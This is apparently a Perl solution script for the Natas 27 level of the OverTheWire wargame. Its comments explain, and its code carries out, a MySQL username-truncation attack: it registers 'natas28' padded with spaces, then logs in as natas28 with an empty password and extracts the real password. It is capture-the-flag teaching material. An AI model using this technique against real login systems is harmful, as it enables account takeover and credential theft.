#!/bin/perl
use LWP::Simple;
use HTML::Parse;
use HTTP::Request;
use HTTP::Response;
use HTTP::Cookies;
use URI;
use v5.16.3;

my $user = 'natas27';
my $login = shift or die "Please provide the password as argument\n";
my $host = $user.'.natas.labs.overthewire.org';
my $uri = URI->new(sprintf("http://%s:%s@%s", $user, $login, $host));
my $ua = LWP::UserAgent->new;

# Hacking magic
# My initial idea was to try to inject a user natas28 without a password continuously until I reach the database reset.
# However, somehow I didn't get this to work. After a little bit of googling, I found out most people did something similar and it worked.
# So, obviously, I was the stupid one here.
#
# Then I stumbled upon this: http://r4stl1n.github.io/2014/12/30/OverTheWire-Natas25-28.html
# Raynaldo Rivera had a much smarter solution for this problem and I am shamelessly stealing it:
# Inject natas28 + 64  spaces + a as a username.
# This will do some great magic. First of all, the validUoser() function will look for that user, but it is obviously not present.
# So we create a new user. When creating a new user, the username will be trimmed to 64 spaces, though, because the maximum
# row size is 64kB. The user created will be: natas28 + 57 spaces
# The important thing is that it will be trimmed when creating the user. Not while calling validUser()
#
# The MySQL '=' function (comparison) makes strings to equal length filling the shorter one with whitespaces before comparing
# Hence,    "natas28   " =  "nattas28"        will result in
#           "natas28   " =  "nattas28   "     and therefore return 1.
#
# So, after injecting our user, if we login again, but this time with the user natas28 and no password, this will happen:
# natas28 obviously exists. So validUser() will return true.
# Then, checkCredentials() is called. There, it will look for a user named natas28 and the corresponding password (which is null).
# The user natas28 does not return true. But our injected user natas28 + 57 spaces will return true.
# This is, because of the aforementioned thing. Comparing natas28 to natas28 + 57 returns true in MySQL. That's why checkCredentials() will return true
# if we login with the user natas28 and the password for natas28 + 57 spaces
# Afterwards, dumpData() will be called. But dumpData() is given the username we entered as argument, so it will look for the user natas28 in the databse.
# This will return in dumping the data for the original user natas28 and now we have the password

# Make first request: Inject user
# natas28 + 64 spaces + a
$uri->query_form("username" => "natas28" . " "x64 . "a", "password" => "");
my $request = new HTTP::Request('GET' => $uri);
my $response;
$response = $ua->request($request);

# Make second request:
# natas28
$uri->query_form("username" => "natas28", "password" => "");
$request = new HTTP::Request('GET' => $uri);
$response = $ua->request($request);
$_ = parse_html($response->content)->format;
if (/(.{32})\s\)/) {
  say "The password for natas28 is " . $1;
}
else {
  say "Could not retrieve password.";
}
